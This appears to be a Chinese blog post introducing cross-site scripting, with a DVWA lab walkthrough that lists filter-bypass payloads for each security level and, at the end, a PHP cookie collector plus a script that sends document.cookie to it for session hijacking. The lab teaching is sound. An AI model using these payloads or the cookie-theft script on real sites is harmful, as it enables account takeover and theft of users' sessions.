<!DOCTYPE HTML>
<html>

<head>
	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
	<link rel="shortcut icon" href="/img/logo_miccall.png">
	
			    <title>
    NYQX
    </title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="/css/mic_main.css" />
    <link rel="stylesheet" href="/css/dropdownMenu.css" />
    <meta name="keywords" content="NYQX" />
    
    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	 
    <noscript>
        <link rel="stylesheet" href="/css/noscript.css" />
    </noscript>
    <style type="text/css">
        body:before {
          content: ' ';
          position: fixed;
          top: 0;
          background: url('/img/bg.jpg') center 0 no-repeat;
          right: 0;
          bottom: 0;
          left: 0;
          background-size: cover; 
        }
    </style>

			    
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.scrollex.min.js"></script>
    <script src="/js/jquery.scrolly.min.js"></script>
    <script src="/js/skel.min.js"></script>
    <script src="/js/util.js"></script>
    <script src="/js/main.js"></script>
	
</head>
    
		
<!-- Layouts -->



<!--  代码渲染  -->
<link rel="stylesheet" href="/css/prism_coy.css" />
<link rel="stylesheet" href="/css/typo.css" />
<!-- 文章页 -->
<body class="is-loading">
    <!-- Wrapper 外包 s-->
    <div id="wrapper" class="fade-in">
        <!-- Intro 头部显示 s -->
        <!-- Intro 头部显示 e -->
        <!-- Header 头部logo start -->
        <header id="header">
    <a href="/" class="logo">Ting</a>
</header>
        <!-- Nav 导航条 start -->
        <nav id="nav" class="special" >
            <ul class="menu links" >
			<!-- Homepage  主页  --> 
			<li >
	            <a href="/" rel="nofollow">主页</a>
	        </li>
			<!-- categories_name  分类   --> 
	        
	        <li class="active">
	            <a href="#s1">分类</a>
	                    <ul class="submenu">
	                        <li>
	                        
	                    </ul>
	        </li>
	        
	        <!-- archives  归档   --> 
	        
	        
		        <!-- Pages 自定义   -->
		        
		        <li>
		            <a href="/gallery/" title="图库">
		                图库
		            </a>
		        </li>
		        
		        <li>
		            <a href="/tag/" title="标签">
		                标签
		            </a>
		        </li>
		        


            </ul>
            <!-- icons 图标   -->
			<ul class="icons">
                    
                    <li>
                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
                            <i class="icon fa fa-github"></i>
                        </a>
                    </li>
                    
                    <li>
                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
                            <i class="icon fa fa-500px"></i>
                        </a>
                    </li>
                    
			</ul>
</nav>

        <div id="main" >
            <div class ="post_page_title_img" style="height: 25rem;background-image: url(w.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >初见XSS</h2></a>
            </div>
            <!-- Post -->
            <div class="typo" style="padding: 3rem;">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h4 id="emsp-emsp-懒癌晚期。。。"><a href="#emsp-emsp-懒癌晚期。。。" class="headerlink" title="&emsp;&emsp;懒癌晚期。。。"></a>&emsp;&emsp;懒癌晚期。。。</h4><p><img src="/2018/07/09/xss/0.jpg" alt="0"></p>
<hr>
<p><br></p>
<hr>
<h3 id="0、基础知识"><a href="#0、基础知识" class="headerlink" title="0、基础知识"></a>0、基础知识</h3><p>&emsp;&emsp;1.<strong>Html</strong>是一种超文本标记语言。其结构包括“头”部分（英语：Head）、和“主体”部分（英语：Body），其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。由html各类标签组成。<br>&emsp;&emsp;2.<strong>JavaScript</strong>一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML（标准通用标记语言下的一个应用）网页上使用，用来给HTML网页增加动态功能。</p>
<blockquote>
<p>Javascript的一些弹窗函数：<br>1.<em>alert()</em>    用于提示<br>2.<em>confirm()</em>  用于和用户交互确认<br>3.<em>prompt()</em>   弹框让用户输入信息</p>
</blockquote>
<hr>
<h3 id="1、认识XSS"><a href="#1、认识XSS" class="headerlink" title="1、认识XSS"></a>1、认识XSS</h3><h4 id="概念："><a href="#概念：" class="headerlink" title="概念："></a><1>概念：</1></h4><p>&emsp;&emsp;一种出现在web应用程序中的计算机安全漏洞。由于web应用程序对用户的输入过滤不严而产生。恶意攻击者通过“HTML注入”篡改网页，插入恶意脚本。当用户在浏览网页时，就会执行实现其中的恶意脚本，从而控制用户浏览器行为的一种攻击方式。</p>
<h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a><2>危害：</2></h4><p>1.网络钓鱼，包括盗取各类的用户账号<br>2.窃取用户cookie<br>3.强制弹出广告页面，刷流量<br>4.页面挂马<br>5.提升用户权限，进一步渗透网站<br>6.传播跨站脚本蠕虫</p>
<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a><3>分类：</3></h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h5><p>&emsp;&emsp;反射型跨站脚本也称作<strong>非持久型</strong>、参数型跨站脚本，这类型的脚本最常见，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中。<br>&emsp;&emsp;一般使用的已经构造好的恶意URL发送给受害者，诱使受害者点击触发，只执行一次非持久化。<br>&emsp;&emsp;反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。</p>
<blockquote>
<p><img src="/2018/07/09/xss/1.jpg" alt="1"></p>
</blockquote>
<hr>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h5><p>&emsp;&emsp;存储型XSS比反射型跨站脚本根据威胁，并且可能影响到web服务器的自身安全。<br>&emsp;&emsp;此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包&emsp;&emsp;含此恶意的代码页面就会执行恶意代码。<br>浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。</p>
<blockquote>
<p><img src="/2018/07/09/xss/2.jpg" alt="2"></p>
</blockquote>
<hr>
<h5 id="dom-xss"><a href="#dom-xss" class="headerlink" title="dom-xss"></a><strong>dom-xss</strong></h5><p>&emsp;&emsp;DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。<br>&emsp;&emsp;DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。<br>&emsp;&emsp;DOM-XSS 的数据流向是：URL–&gt;浏览器。</p>
<hr>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><4>绕过</4></h4><p>&emsp;&emsp;在测试的时候会遇到这样的情况的，明明有一个XSS的漏洞，但是却有XSS过滤规则或则waf保护导致我们不能利用，比如我们输入：</p>
<p>&lt;script>alert(‘xss’)&lt;/script><br>会被转换为<br><em>&lt;script>alert(&gt;’xss\&lt;’)&lt;/script></em><br>&emsp;&emsp;这样的话我们的XSS就不生效了。<br>以下是几种简单的绕过XSS的方法</p>
<blockquote>
</blockquote>
<p><em>1.绕过magic_quotes_gpc(String.fromCharCode()函数)</em><br><em>2.HEX编码</em><br><em>3.改变大小写</em><br><em>4.关闭标签</em>(‘&gt;&lt;script>alert(‘xss’)&lt;/script>)*</p>
<h4 id="DVWA实验"><a href="#DVWA实验" class="headerlink" title="DVWA实验"></a><5>DVWA实验</5></h4><h5 id="反射型XSS-1"><a href="#反射型XSS-1" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h5><p>下面对四种级别的代码进行分析：<br><strong>Low:</strong></p>
<blockquote>
<p>源代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。<br><em>漏洞利用：</em><br>输入<em>&lt;script>alert(/xss/)&lt;/script></em>,成功弹框。</p>
</blockquote>
<p><strong>Medium:</strong></p>
<blockquote>
<p>源代码使用str_replace函数将输入中的&lt;script>删除，这种防护机制是可以被轻松绕过的。<br><em>漏洞利用：</em><br>1.双写绕过<br>输入<em>&lt;sc&lt;script>ript>alert(/xss/)&lt;/script></em>，成功弹框。<br>2.大小写混淆绕过<br>输入<em>&lt;ScRipt>alert(/xss/)&lt;/script></em>，成功弹框。</p>
</blockquote>
<p><strong>High:</strong></p>
<blockquote>
<p>源代码使用preg_replace() 函数进行正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br><em>漏洞利用：</em><br>虽然无法使用&lt;script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。<br>输入<em>&lt;img src=1 onerror=alert(/xss/)></em>，成功弹框。</p>
</blockquote>
<p><strong>Impossible:</strong></p>
<blockquote>
<p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素。<br><em>无漏洞利用。</em></p>
</blockquote>
<p><strong>弹框如图：</strong></p>
<blockquote>
<p><img src="/2018/07/09/xss/3.jpg" alt="3"></p>
</blockquote>
<hr>
<h5 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a><strong>储存型XSS</strong></h5><p>下面对四种级别的代码进行分析：<br><strong>Low:</strong></p>
<blockquote>
<p>源代码对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<br><em>漏洞利用：</em><br>1.message一栏输入<em>&lt;script>alert(/xss/)&lt;/script></em>，成功弹框。<br>2.name一栏前端有字数限制，可采用转包修改name参数为<em>&lt;script>alert(/xss/)&lt;/script></em>，成功弹框。</p>
</blockquote>
<p><strong>Medium:</strong></p>
<blockquote>
<p>源代码对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script>字符串，仍然存在存储型XSS漏洞。<br><em>漏洞利用：</em><br>1.双写绕过<br>抓包修改name参数为<em>&lt;sc&lt;script>ript&gt;alert(/xss/)&lt;/script></em>，成功弹框。<br>2.大小写混淆绕过<br>抓包修改name参数为<em>&lt;Script>alert(/xss/)&lt;/script></em>，成功弹框。</p>
</blockquote>
<p><strong>High:</strong></p>
<blockquote>
<p>源代码使用正则表达式过滤了&lt;script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。<br><em>漏洞利用：</em><br>抓包修改name参数为<em>&lt;img src=1 onerror=alert(/xss/)></em>，成功弹框。</p>
</blockquote>
<p><strong>Impossible:</strong></p>
<blockquote>
<p>源代码通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。<br><em>无漏洞利用。</em></p>
</blockquote>
<p><strong>抓包修改如图：</strong></p>
<blockquote>
<p><img src="/2018/07/09/xss/4.jpg" alt="4"></p>
</blockquote>
<hr>
<p><strong>弹框如图：</strong></p>
<blockquote>
<p><img src="/2018/07/09/xss/5.jpg" alt="5"></p>
</blockquote>
<hr>
<h3 id="2、XSS盗取cookie登陆"><a href="#2、XSS盗取cookie登陆" class="headerlink" title="2、XSS盗取cookie登陆"></a>2、XSS盗取cookie登陆</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><1>原理</1></h4><blockquote>
<p><img src="/2018/07/09/xss/6.jpg" alt="6"></p>
</blockquote>
<hr>
<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a><2>操作</2></h4><p>1.编写一个接受cookie的PHP脚本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $cookie=$_GET[‘cookie’];</span><br><span class="line">   file_put_contents(‘cookie.txt’,$cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>2.构造攻击盗取cookie脚本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&apos;http://127.0.0.1/dvwa/cookie.php?cookie=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>3.获取cookie并登陆：</p>
<blockquote>
<p><img src="/2018/07/09/xss/7.jpg" alt="7"></p>
</blockquote>
<hr>
<blockquote>
<p><img src="/2018/07/09/xss/8.jpg" alt="8"></p>
</blockquote>
<hr>
<hr>
<h3 id="╯▽╰-！诗乃镇楼！-╯▽╰"><a href="#╯▽╰-！诗乃镇楼！-╯▽╰" class="headerlink" title="╯▽╰ ！诗乃镇楼！ ╯▽╰"></a>╯▽╰ ！诗乃镇楼！ ╯▽╰</h3><p><img src="/2018/07/09/xss/ww.jpg" alt="诗乃"></p>

            </div>

            <!-- Post Comments -->
            
    <!-- 使用 valine -->
<div id="comment">
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script>
    new Valine({
        el: '#comment' ,
        notify: true,
        verify: false,
        app_id: 'your appId',
        app_key: 'your appkey',
        placeholder: 'Please leave your footprints',
        pageSize: '10',
        avatar: '',
        avatar_cdn: 'https://gravatar.loli.net/avatar/'
    });
</script>
</div>
<style>
   #comment{
        padding: 2pc;
    }
</style>


        </div>
        <!-- Copyright 版权 start -->
                <div id="copyright">
            <ul>
                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
            </ul>
            
            	<span id="busuanzi_container_site_pv">2019总访问量<span id="busuanzi_value_site_pv"></span>次</span>
			
        </div>
    </div>
</body>



 	
</html>
